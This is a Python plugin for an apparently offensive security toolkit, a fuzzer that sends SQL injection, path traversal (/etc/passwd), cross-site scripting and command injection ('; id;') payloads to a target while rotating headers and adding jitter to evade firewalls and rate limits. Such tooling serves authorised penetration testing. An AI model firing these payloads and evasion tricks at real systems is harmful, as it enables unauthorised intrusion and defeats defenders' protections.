import asyncio
import httpx
from core.evasion import get_evasion_headers, apply_jitter

PLUGIN_META = {
    "name": "WAF-Resilient Vulnerability Fuzzer",
    "flag": "--vuln-fuzz",
    "description": "Run offensive fuzzer with WAF evasion (Header rotation & Jitter)",
    "category": "offensive"
}

PAYLOADS = [
    ("SQL Injection", "' OR '1'='1"),
    ("Local File Inclusion", "../../../etc/passwd"),
    ("Cross-Site Scripting", "<script>alert(1)</script>"),
    ("Command Injection", "; id;")
]

async def run(target_url, reporter=None):
    print(f"[*] Starting WAF-Resilient Vulnerability Fuzzing against: {target_url}")
    findings = []
    
    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        for name, payload in PAYLOADS:
            test_url = f"{target_url}/?s={payload}"
            headers = get_evasion_headers()
            
            try:
                # Apply anti-rate-limit jitter before each request
                await apply_jitter(0.3, 0.8)
                
                resp = await client.get(test_url, headers=headers, timeout=5.0)
                
                # Check for WAF block triggers (HTTP 403/406/429)
                if resp.status_code in [403, 406, 429]:
                    print(f"[!] [WAF] Request blocked with HTTP {resp.status_code} for payload: {name}")
                elif resp.status_code == 500 and "SQL" in name:
                    desc = f"Potential SQL Injection vulnerability flagged at: {test_url}"
                    print(f"[!] [HIGH] {desc}")
                    findings.append({"url": test_url, "type": name, "severity": "HIGH"})
                    if reporter:
                        reporter.add_finding(module="Vuln Fuzzer", severity="HIGH", description=desc, details={"payload": payload})
                else:
                    print(f"[*] Fuzz test [{name}] -> Status: {resp.status_code}")
            except Exception as e:
                pass

    print(f"[*] Vulnerability fuzzing completed. Findings: {len(findings)}")
    if reporter:
        reporter.add_section("WAF-Resilient Vulnerability Fuzzing", {"findings_count": len(findings), "findings": findings})
